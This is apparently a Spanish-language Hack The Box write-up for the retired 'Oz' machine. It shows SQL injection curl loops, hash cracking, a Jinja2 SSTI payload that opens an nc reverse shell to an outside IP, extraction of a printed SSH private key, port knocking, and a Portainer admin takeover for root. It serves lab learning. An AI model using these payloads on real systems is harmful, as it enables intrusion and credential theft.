---
layout: post
title:  "Maquina  Retirada Oz de Hack The Box (Necesario VIP)"
description: En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada OZ
tags: HTB, SQLI, SSTI(Server Side Template Injection), Port Knocking, Portainer, Dockers, Maquinas Retiradas, Writeup
---

# OZ ~ Hack The Box

Realizamos el Primer escaneo con Nmap
```bash
$" nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -oG allports 10.10.10.96       "
``` 
Procedemos con el siguiente escaneo de Nmap
```bash
PORT     STATE SERVICE VERSION
80/tcp   open  http    Werkzeug httpd 0.14.1 (Python 2.7.14)
|_http-server-header: Werkzeug/0.14.1 Python/2.7.14
|_http-title: OZ webapi
|_http-trane-info: Problem with XML parsing of /evox/about
8080/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.14)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Werkzeug/0.14.1 Python/2.7.14
| http-title: GBR Support - Login
|_Requested resource was http://10.10.10.96:8080/login
|_http-trane-info: Problem with XML parsing of /evox/about
```
Procedemos con la herramienta `Wfuzz` a enumerar rutas y directorios
```bash
# wfuzz -c --hc=404 -w /usr/share/wordlist/rockyou.txt http://10.10.10.96/FUZZ
"/users/"
```
Probamos a seguir enumerando con la herramienta `Wfuzz` por la ruta `/users/FUZZ` y nos da un fallo de `Internal Server Error` cuando llega a la `'`
Sera vulnerable a una `Injeccion SQL`?
```bash
Probamos a hacer un "' order by 1-- -" y nos responde un "NULL"
```
Con esto verificamos que es vulnerable a SQLI y procedemos a realizar las siguientes consultas SQLI:
```mysql
Consulta 1:
"' union select database()-- -"
10.10.10.96/users/'%20union%20select%20database()--%20-			  RESPUESTA DEL SERVIDOR:	“ozdb” Base de Datos en USO

Consulta 2:
"' union select user()-- -"
10.10.10.96/users/'%20union%20select%20user()--%20-						RESPUESTA DEL SERVIDOR: "dorthi@10.100.10.6"   un contenedor ?? de donde es esta IP ¿¿??

Consulta 3:
usamos Curl para hacer las peticiones: 
"' union select schema_name from information_schema.shemata limit 0,1-- -" e iteramos sobre el valor de 0 con un bucle para $i y sacar todas los nombres de las bases de datos
# for i in $(seq 0 5); do curl -s -X GET "http://10.10.10.96/users/'%20union%20select%20schema_name%20from%20information_schema.schemata%20limit%20$i,%201--%20-"  | jq ; done | tr '{}' ' '  
 
  "username": "information_schema"
  "username": "mysql"
  "username": "ozdb"
  "username": "performance_schema"

Consulta 4:
Vamos a averiguar las tablas de una de las bases de datos encontradas anteriormente:
"' union select table_name from information_schema.tables where table_schema="osdb" limit 0,1-- -" 
# for i in $(seq 0 10); do curl -s -X GET "http://10.10.10.96/users/'%20union%20select%20table_name%20from%20information_schema.tables%20where%20table_schema=%22ozdb%22%20limit%20$i,%201--%20-"  | jq ; done | tr '{}' ' '  
 
  "username": "tickets_gbw"
  "username": "users_gbw"
   null

Consulta 5:
Vamos a averiguar las columnas de la tabla en la base de datos que ya hemos encontrado: Usamos Curl: Iteramos sobre un FOR
"' union select column_name from information_schema.columns where table_schema="ozdb" and table_name="users_gbw" limit 0,1-- -"
# for i in $(seq 0 5); do curl -s -X GET "http://10.10.10.96/users/'%20union%20select%20column_name%20from%20information_schema.columns%20where%20table_schema=%22ozdb%22%20and%20table_name=%22users_gbw%22%20limit%20$i,%201--%20-"  | jq ; done | tr '{}' ' '  
 
  "username": "id"
  "username": "username"
  "username": "password"
```
Ya tenemos los Campos `Username & Password` que son en los que queremos visualizar la `DATA` dentro de ellos.
Como `Solo Tenemos una columna` necesitamos jugar con un `GROUP_CONCAT(username, password)` para poder listar dos campos en una sola columna.

```bash
Consulta 6:
vamos a listar los campos Username, Password de la tabla "users_gbw" de la base de datos "ozdb"
"' union select group_concat(username,':',password) from users_gbw-- -"
# curl -s -X GET "http://10.10.10.96/users/'%20union%20select%20group_concat(username,%22:%22,password)%20from%20users_gbw--%20-"  | tr ',' '\n'                     

username":"dorthi:$pbkdf2-sha256$5000$aA3h3LvXOseYk3IupVQKgQ$ogPU/XoFb.nzdCGDulkW3AeDZPbK580zeTxJnG0EJ78
tin.man:$pbkdf2-sha256$5000$GgNACCFkDOE8B4AwZgzBuA$IXewCMHWhf7ktju5Sw.W.ZWMyHYAJ5mpvWialENXofk
wizard.oz:$pbkdf2-sha256$5000$BCDkXKuVMgaAEMJ4z5mzdg$GNn4Ti/hUyMgoyI7GKGJWeqlZg28RIqSqspvKQq6LWY
coward.lyon:$pbkdf2-sha256$5000$bU2JsVYqpbT2PqcUQmjN.Q$hO7DfQLTL6Nq2MeKei39Jn0ddmqly3uBxO/tbBuw4DY
toto:$pbkdf2-sha256$5000$Zax17l1Lac25V6oVwnjPWQ$oTYQQVsuSz9kmFggpAWB0yrKsMdPjvfob9NfBq4Wtkg
admin:$pbkdf2-sha256$5000$d47xHsP4P6eUUgoh5BzjfA$jWgyYmxDK.slJYUTsv9V9xZ3WWwcl9EBOsz.bARwGBQ
```
Encontramos unos hashes, estos hashes pueden ser `crackeados` y averiguamos el tipo de hash que es para luego mediante el uso de la herramienta `Hashcat` 

- TIPO DE HASH - Identificado en hashcat examples hashes wiki 
`| PBKDF2-HMAC-SHA256 | sha256:1000:MTc3MTA0MTQwMjQxNzY=:PYjCU215Mi57AYPKva9j7mvF4Rc5bCnt |`

Adecuamos nuestros hashes a este hash para que `Hashcat` lo pille correctamente y nos haga su trabajo de Fuerza Fruta
```bash
┌──(root💀pro)-[/home/…/Escritorio/HTB/Oz/nmap]
└─# cat hash                                                             
sha256:5000:BCDkXKuVMgaAEMJ4z5mzdg:GNn4Ti/hUyMgoyI7GKGJWeqlZg28RIqSqspvKQq6LWY
```
Procedemos con Hashcat a intentar crackear primero el hash del usuario "Wizard.oz"
```bash
# hashcat -m 10900 hash dicc
hashcat (v6.1.1) starting...

=============================================================================================================================
Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 66 MB

Dictionary cache built:
* Filename..: dicc
* Passwords.: 31601
* Bytes.....: 317299
* Keyspace..: 31601
* Runtime...: 0 secs

"sha256:5000:BCDkXKuVMgaAEMJ4z5mzdg:GNn4Ti/hUyMgoyI7GKGJWeqlZg28RIqSqspvKQq6LWY": "wizardofoz22"
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: PBKDF2-HMAC-SHA256
Hash.Target......: sha256:5000:BCDkXKuVMgaAEMJ4z5mzdg:GNn4Ti/hUyMgoyI7...Qq6LWY
Time.Started.....: Sun Jun 20 12:52:27 2021 (0 secs)
Time.Estimated...: Sun Jun 20 12:52:27 2021 (0 secs)
Guess.Base.......: File (dicc)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    15871 H/s (11.21ms) @ Accel:512 Loops:256 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 4096/31601 (12.96%)
Rejected.........: 0/4096 (0.00%)
Restore.Point....: 0/31601 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4864-4999
Candidates.#1....: mendoza -> zozokey

Started: Sun Jun 20 12:52:09 2021
Stopped: Sun Jun 20 12:52:29 2021
```
Ya tenemos unas Credenciales como el user `wizard.oz : wizardofoz22`
Vamos a hechar un ojo al puerto 8080 y vemos que tenemos un panel loguin
Procedemos con las credenciales obtenidas. Nos logueamos correctamente
__foto__

Vemos que podemos crear etiquetas o comentarios. Vemos tambien que el `Wapallizer` nos reporta que estamos ante un `Flask`

# Server Side Template Injection (SSTI)
Cuando tenemos una aplicacion como `FLASK` corriendo es posible que se pueda injectar codigo de la siguiente forma `{{2*2}}` si al enviar este codigo la respuesta del lado del servidor vemos que cambia a `4` indica que puede ser `vulnerable a SSTI`

Sacamos el `Burpsuite` he interceptamos la peticion de crear una etiqueta nueva!! 
Vamos a hacer uso de esta pagina https://github.com/swisskyrepo/PayloadsAllTheThings
En la parte de SSTI vemos varios recursos entre ellos `Jinja2 - Read remote file`
```bash
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```
y recibimos correctamente el archivo `/etc/passwd`
Tambien vemos que hay un recurso para un RCE `Jinja2 - Remote Code Execution`
`Exploit the SSTI by calling Popen without guessing the offset`
```bash
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("{x()._module.__builtins__['__import__']('os').popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc 10.10.15.4 443 >/tmp/f"").read().zfill(417)}}{%endif%}{% endfor %}
```
Se ve que el simbolo & no le gustaba y lo url encodeamos y listo. Nos ponemos en una session de `nc -vlnp 443` y esperamos a recibir la conexion al tramitar desde el Repiter la pwticion Web con el RCE.

Una vez dentro, vemos que no tenemos una bash asique tiramos de `rlwrap para simular la tty`

Enumeramos el sistema ya que vemos que entramos como root en la ip `10.100.10.2` no en la de la maquina `10.10.10.96`

Encontramos una contraseña para el user `root` en la ruta `/app/`archivo`start.sh`:
```bash
dentro de la ip 10.100.10.2 atraves de 8080 gracias al SSTI 
cat start.sh
#!/bin/bash

docker run -d -v /connect/mysql:/var/lib/mysql --name ozdb \
--net prodnet --ip 10.100.10.4 \
-e MYSQL_ROOT_PASSWORD=SuP3rS3cr3tP@ss \
-e MYSQL_USER=dorthi \
-e MYSQL_PASSWORD=N0Pl4c3L1keH0me \
-e MYSQL_DATABASE=ozdb \
-v /connect/sshkeys:/home/dorthi/.ssh/:ro \
-v /dev/null:/root/.bash_history:ro \
-v /dev/null:/root/.ash_history:ro \
-v /dev/null:/root/.sh_history:ro \
--restart=always \
mariadb:5.5
```
```bash
mysql_root = SuP3rS3cr3tP@ss
```

Contraseña encontrada en `directorio TiCKETERS / archivo: database.pyc`
```bash
dorthi : N0Pl4c3L1keH0me   Ip:  10.100.10.4   MYSQL ?¿
```
Nos montamos una pequeño `oneliner` para averiguar atraves de `nc -vnz`  para comprobar conexiones abiertas, y ver si el servicio de 'MySQL'
```bash
# for port in $(seq 1 10000);do nc -vnz 10.100.10.4 $port; done
10.100.10.4 (10.100.10.4:3306) open
```
Vemos que el puerto `3306 MySQL` esta abierto en la maquina `10.100.10.4`

Seguimos enumerando un poco el sistema `10.100.10.2` y vemos que en la raiz `/` tenemos:
```
# ls -la
total 72
drwxr-xr-x   53 root     root          4096 May 15  2018 .
drwxr-xr-x   53 root     root          4096 May 15  2018 ..
-rwxr-xr-x    1 root     root             0 May 15  2018 .dockerenv
"drwxr-xr-x    2 root     root          4096 Apr 24  2018 .secret"   ---> 
"drwxr-xr-x    5 root     root          4096 May 15  2018 app"
drwxr-xr-x    2 root     root          4096 Apr 27  2018 bin
"drwxr-xr-x    3 root     root          4096 May 15  2018 containers"
```
nos movemos al directorio `.secret`:
```bash
#cd .secret
#cat knockd.conf
[options]
        logfile = /var/log/knockd.log

[opencloseSSH]

        sequence        = 40809:udp,50212:udp,46969:udp
        seq_timeout     = 15
        start_command   = ufw allow from %IP% to any port 22
        cmd_timeout     = 10
        stop_command    = ufw delete allow from %IP% to any port 22
        tcpflags        = syn
/.secret # 
```
Vemos un archivo de configuracion llamado `"knockd.conf"` que nos recuerda al concepto de `PORT KNOCKING` asique seguimos enumerando el sistema con este concepto en mente ya que vemos que el archivo de configuracion nos indica que se abre el servicio ssh en la maquina victima al `golpear por UDP` los puertos indicados `40809 50212 46969`

# Port Knocking Concepto Nuevo

Este archivo resulta que es para hacer PORT KNOCKING concepto nuevo
 
se supone que el Port Knocking es una secuecia de golpes por UDP para que un servicio que no esta abierto a internet se abra a traves de esta tecnica
que es lanzar un scaneo por udp con nmap a los puerto indicados de una IP objetivo 
 
# Mysql & MysqlShow
Vamos a probar autenticarnos al servicio de `Mysql` desde la ip `10.100.10.2` a la `10.100.10.4` por el puerto `3306`
Nos metemos al servicio de mysql de la 10.100.10.4 ya que el puerto 3306 esta open
```bash
 mysqlshow -h 10.100.10.4 -udorthi -pN0Pl4c3L1keH0me mysql user
```
Usamos `mysqlshow` para listar toda la data 
```bash
mysql -h 10.100.10.4 -udorthi -pN0Pl4c3L1keH0me -e 'use mysql; select User,Password from user;'
User    Password                                                                                                                                                                 root    		*61A2BD98DAD2A09749B6FC77A9578609D32518DD                                                                                                                             dorthi  *43AE542A63D9C43FF9D40D0280CFDA58F6C747CA                                                                                                                               
```
Como sabemos si estos hashes son lo que ya tenemos?De las dos contraseñas encontradas?? pues podemos usar mysql para verificarlo de esta forma
si nosotros ya tenemos las contraseñas en texto claro.
```bash
mysql -h 10.100.10.4 -udorthi -pN0Pl4c3L1keH0me -e 'use mysql; select password("N0Pl4c3L1keH0me") from user;'
password("N0Pl4c3L1keH0me")
*43AE542A63D9C43FF9D40D0280CFDA58F6C747CA                                                                                                                                       
```
vemos que si para dorthi

vemos que si para ROOT
```bash
mysql -h 10.100.10.4 -udorthi -pN0Pl4c3L1keH0me -e 'use mysql; select password("SuP3rS3cr3tP@ss") from user;'
password("SuP3rS3cr3tP@ss")
*61A2BD98DAD2A09749B6FC77A9578609D32518DD
*61A2BD98DAD2A09749B6FC77A9578609D32518DD
*61A2BD98DAD2A09749B6FC77A9578609D32518DD
/containers/database # 
```
Desde aqui tambien podemos hacer otras cosas como listar archivos locales de la maquina victima,
y desde la injeccion en sql por fuera tambien prodriamos intentarlo. Lo probamos:
Desde el `SQLI` en el puerto 80 ip `10.10.10.96`

Paso 1 - Pasamos a hex la ruta que queremos apuntar para que se la trague correctamente
```bash
# echo "/home/dorthi/.shh/id_rsa" | xxd -ps                                                                                                                                      2f686f6d652f646f727468692f2e7368682f69645f727361
----------------------------------- Apuntamos a la ruta con un load_file(/ruta/)
"http://10.10.10.96/users/'%20union%20select%20load_file(0x2f686f6d652f646f727468692f2e7373682f69645f727361)--%20-"
-----------------------------------
Tratamiento del archivo ssh id_rsa encontrado

# cat id_rsa | sed 's/\\n/\n/g'                                                                                                                                                                               
        "-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,66B9F39F33BA0788CD27207BF8F2D0F6

RV903H6V6lhKxl8dhocaEtL4Uzkyj1fqyVj3eySqkAFkkXms2H+4lfb35UZb3WFC
b6P7zYZDAnRLQjJEc/sQVXuwEzfWMa7pYF9Kv6ijIZmSDOMAPjaCjnjnX5kJMK3F
e1BrQdh0phWAhhUmbYvt2z8DD/OGKhxlC7oT/49I/ME+tm5eyLGbK69Ouxb5PBty
h9A+Tn70giENR/ExO8qY4WNQQMtiCM0tszes8+guOEKCckMivmR2qWHTCs+N7wbz
a//JhOG+GdqvEhJp15pQuj/3SC9O5xyLe2mqL1TUK3WrFpQyv8lXartH1vKTnybd
9+Wme/gVTfwSZWgMeGQjRXWe3KUsgGZNFK75wYtA/F/DB7QZFwfO2Lb0mL7Xyzx6
ZakulY4bFpBtXsuBJYPNy7wB5ZveRSB2f8dznu2mvarByMoCN/XgVVZujugNbEcj
evroLGNe/+ISkJWV443KyTcJ2iIRAa+BzHhrBx31kG//nix0vXoHzB8Vj3fqh+2M
EycVvDxLK8CIMzHc3cRVUMBeQ2X4GuLPGRKlUeSrmYz/sH75AR3zh6Zvlva15Yav
5vR48cdShFS3FC6aH6SQWVe9K3oHzYhwlfT+wVPfaeZrSlCH0hG1z9C1B9BxMLQr
DHejp9bbLppJ39pe1U+DBjzDo4s6rk+Ci/5dpieoeXrmGTqElDQi+KEU9g8CJpto
bYAGUxPFIpPrN2+1RBbxY6YVaop5eyqtnF4ZGpJCoCW2r8BRsCvuILvrO1O0gXF+
wtsktmylmHvHApoXrW/GThjdVkdD9U/6Rmvv3s/OhtlAp3Wqw6RI+KfCPGiCzh1V
0yfXH70CfLO2NcWtO/JUJvYH3M+rvDDHZSLqgW841ykzdrQXnR7s9Nj2EmoW72IH
znNPmB1LQtD45NH6OIG8+QWNAdQHcgZepwPz4/9pe2tEqu7Mg/cLUBsTYb4a6mft
icOX9OAOrcZ8RGcIdVWtzU4q2YKZex4lyzeC/k4TAbofZ0E4kUsaIbFV/7OMedMC
zCTJ6rlAl2d8e8dsSfF96QWevnD50yx+wbJ/izZonHmU/2ac4c8LPYq6Q9KLmlnu
vI9bLfOJh8DLFuqCVI8GzROjIdxdlzk9yp4LxcAnm1Ox9MEIqmOVwAd3bEmYckKw
w/EmArNIrnr54Q7a1PMdCsZcejCjnvmQFZ3ko5CoFCC+kUe1j92i081kOAhmXqV3
c6xgh8Vg2qOyzoZm5wRZZF2nTXnnCQ3OYR3NMsUBTVG2tlgfp1NgdwIyxTWn09V0
nOzqNtJ7OBt0/RewTsFgoNVrCQbQ8VvZFckvG8sV3U9bh9Zl28/2I3B472iQRo+5
uoRHpAgfOSOERtxuMpkrkU3IzSPsVS9c3LgKhiTS5wTbTw7O/vxxNOoLpoxO2Wzb
/4XnEBh6VgLrjThQcGKigkWJaKyBHOhEtuZqDv2MFSE6zdX/N+L/FRIv1oVR9VYv
QGpqEaGSUG+/TSdcANQdD3mv6EGYI+o4rZKEHJKUlCI+I48jHbvQCLWaR/bkjZJu
XtSuV0TJXto6abznSC1BFlACIqBmHdeaIXWqH+NlXOCGE8jQGM8s/fd/j5g1Adw3
-----END RSA PRIVATE KEY-----
```
Ahora que tenemos la `id_rsa` del usuario `dorthi` procedemos con el concepto del `Port Knocking`
Acordarse siempre tenemos que darle `permisos 600`  al `id_rsa`:
`chmod 600 id_rsa`
```bash
┌──(root💀kali)-[/home/…/Escritorio/HTB/Oz/nmap]
└─# for port in 40809 50212 46969; do nmap -sU -Pn --max-retries 0 -p$port 10.10.10.96; done &> /dev/null; ssh -i id_rsa dorthi@10.10.10.96                                     
Enter passphrase for key 'id_rsa': [Introducimos la credencial anteriormente encontrada]

dorthi@Oz:~$ ls
user.txt
dorthi@Oz:~$ cat user.txt 
c21cff3b0c26115143e6cea988dxxxxxx
dorthi@Oz:~$ 
```
Conseguimos el `user.txt` vamos a por el `root.txt`

# Escalada de Privilegios 

Procedemos a hacer una enumeracion del sistema como siempre:
```bash
dorthi@Oz:/admin$ sudo -l
Matching Defaults entries for dorthi on Oz:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dorthi may run the following commands on Oz:
   " (ALL) NOPASSWD: /usr/bin/docker network inspect *"
   " (ALL) NOPASSWD: /usr/bin/docker network ls"



dorthi@Oz:/admin$ sudo docker network inspect bridge
[
    {
        "Name": "bridge",
        "Id": "a6b4f157c9e52f695bffde0984a763b23f382dc0dd4318683c4f920ac374d9ab",
        "Created": "2021-06-20T04:52:02.80355347-05:00",
        "Scope": "local",
        "Driver": "bridge",
        "EnableIPv6": false,
        "IPAM": {
            "Driver": "default",
            "Options": null,
            "Config": [
                {
                    "Subnet": "172.17.0.0/16",
                    "Gateway": "172.17.0.1"
                }
            ]
        },
        "Internal": false,
        "Attachable": false,
        "Containers": {
            "e267fc4f305575070b1166baf802877cb9d7c7c5d7711d14bfc2604993b77e14": {
                "Name": "portainer-1.11.1",
                "EndpointID": "55041e840fae215bf26fe1cfb2c249adf2e00692cdb37103bbfcaf8469a1993c",
                "MacAddress": "02:42:ac:11:00:02",
                "IPv4Address": "172.17.0.2/16",
                "IPv6Address": ""
            }
        },
        "Options": {
            "com.docker.network.bridge.default_bridge": "true",
            "com.docker.network.bridge.enable_icc": "true",
            "com.docker.network.bridge.enable_ip_masquerade": "true",
            "com.docker.network.bridge.host_binding_ipv4": "0.0.0.0",
            "com.docker.network.bridge.name": "docker0",
            "com.docker.network.driver.mtu": "1500"
        },
        "Labels": {}
    }

dorthi@Oz:/admin$ nmap -p- --open -T5 -v -n 172.17.0.2

Starting Nmap 7.01 ( https://nmap.org ) at 2021-06-20 08:49 CDT
Initiating Ping Scan at 08:49
Scanning 172.17.0.2 [2 ports]
Completed Ping Scan at 08:49, 0.00s elapsed (1 total hosts)
Initiating Connect Scan at 08:49
Scanning 172.17.0.2 [65535 ports]
Discovered open port 9000/tcp on 172.17.0.2
Completed Connect Scan at 08:49, 1.49s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up (0.00010s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
9000/tcp open  cslistener
```
Procedemos a hacer un Local Port Forwarding al conectarnos a la maquina del puerto 9000 para verlo en nuestro localhost:9000:
```bash
# for port in 40809 50212 46969; do nmap -sU -Pn --max-retries 0 -p$port 10.10.10.96; done &> /dev/null; ssh -i id_rsa dorthi@10.10.10.96 -L 9000:172.17.0.2:9000                                       255 ⨯ 1 ⚙
Enter passphrase for key 'id_rsa': 
dorthi@Oz:~$
```
Comprobamos que se ha hecho correctamente
```bash
# lsof -i:9000                                                                                                   
COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
ssh     14080 root    4u  IPv6 107500      0t0  TCP localhost:9000 (LISTEN)
ssh     14080 root    5u  IPv4 107501      0t0  TCP localhost:9000 (LISTEN)
```
Y ahora por aqui ya estariamos viendo el servicio de PORTAINER en nuestro 127.0.0.1:9000 
```bash
# curl -s -X POST "http://127.0.0.1:9000/api/users/admin/init" --data  'Username=Topro&Password=pro'  
{"err":"Invalid JSON"}
```
# Portainer Docker App Administration
Buscamos credenciales por defecto y encontramos una forma de setear o resetear la contraseña del admin si no ha sido previamente cambiada.Probamos:

```bash                               
# curl -s -X POST "http://127.0.0.1:9000/api/users/admin/init" --data  '{"Username": "admin", "Password": "pro"}'
```
Entramos a la aplicacion Portainer y vemos que podemos crear un contenedor asique seguimos con el concepto de montar la / raiz de la maquina en un contenedor alojado como una montura para poder cambiar los archivos de la maquina y que se retoquen en la misma maquina

Para ello nos vamos a containers
creamos uno nuevo, le decimos que use la misma imagen que la que aparece en otro contenedor `ya cargado`.
Procedemos a crear la montura de la `/` en nuestro contenedor de nombre `SeTenso` `/mnt/root/`.
le damos a crear. Lo bueno del `Portrainer` es que en nuestro contenedor podemos lanzar una shell interactiva en `/bin/sh/` para poder acceder a la montura creada en el contenedor y visualizar todo el sistema `10.10.10.96` desde la `/`. Ya que tenemos una shell por ssh vamos a darle permisos SUID a la bash para poder conectarnos como root haciendo un `bash -p`. `chmod u+x /bin/bash`  

Cambiamos a la shell por ssh y obtenemos root
```bash
dorthi@Oz:/bin$ bash -p
bash-4.3# whoami
root
bash-4.3# 
```
Y ya podriamos sacar la flag `root.txt`. Maquina Rooteada =D
